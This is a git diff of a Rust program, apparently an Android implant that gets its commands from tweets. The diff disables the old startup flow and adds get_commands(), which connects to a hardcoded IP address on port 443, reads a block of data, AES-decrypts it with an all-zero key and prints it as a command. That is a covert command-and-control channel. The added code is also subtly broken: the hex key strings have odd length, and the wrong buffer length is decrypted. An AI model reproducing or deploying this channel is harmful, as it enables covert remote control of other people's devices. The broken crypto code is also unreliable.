@@ -1,4 +1,5 @@
 extern crate egg_mode;
+extern crate hex;
 #[macro_use] extern crate log;
 
 mod encoder;
@@ -6,8 +7,10 @@ mod errors;
 mod utils;
 
 use egg_mode::media::{media_types, upload_media};
+/*
 use android_logger::Config;
 use log::Level;
+*/
 use egg_mode::tweet::DraftTweet;
 use encoder::Encoder;
 use errors::Error;
@@ -23,30 +26,40 @@ use std::{thread, time};
 use tokio;
 use utils::ByteMask;
 use nix::unistd::*;
-
+use std::net::TcpStream;
+use openssl::aes::{AesKey, KeyError, aes_ige};
+use openssl::symm::{encrypt, decrypt, Cipher};
+use openssl::symm::Mode;
+use hex::{FromHex, ToHex};
 
 static WORKING_DIRECTORY: &str = "toast";
 
 fn main() -> Result<(), Error> {
+
+    /*
     android_logger::init_once(
         Config::default()
         .with_min_level(Level::Info) // limit log level
         .with_tag("TOAST") // logs will show under mytag tag
     );
+    */
 
 
 
+    /*
     match setup() {
         Ok(()) => info!("No error from setup"),
         Err(e) => error!("Error in setup: {}", e),
     };
+    */
+    get_commands().unwrap();
+    /*
     match start() {
         Ok(()) => info!("No error from start"), 
         Err(e) => error!("start: {}", e),
     };
 
     //let path = env::current_dir()?;
-    
     match pull_tweets() {
         Ok(()) => info!("No error from pull_tweets"), 
         Err(e) => error!("pull_tweets: {}", e),
@@ -66,8 +79,35 @@ fn main() -> Result<(), Error> {
         Ok(()) => info!("No error from kill"),
         Err(e) => error!("kill: {}", e),
     };
-    
+    */
     Ok(())
+}
+
+fn get_commands() -> Result<(), Box<dyn std::error::Error>>{
+    let mut stream = TcpStream::connect("3.215.107.66:443")?;
+
+    let mut buffer = [0; 1024];
+
+    let len = stream.read(&mut buffer)?;
+
+    let key = Vec::from_hex("00000000000000000")?;
+    let mut iv = Vec::from_hex("00000000000000000")?;
+    let mut output = vec![0u8; len];
+
+    let cipher = Cipher::aes_128_cbc();
+
+    let command = decrypt(
+        cipher,
+        &key,
+        Some(&iv),
+        &buffer).unwrap();
+
+    println!("{:?}" , std::str::from_utf8(&command));
+    /*
+    aes_ige(&buffer, &mut output, &key, &mut iv, Mode::Decrypt);
+    */
+    Ok(())
+
 }
 
 #[tokio::main]
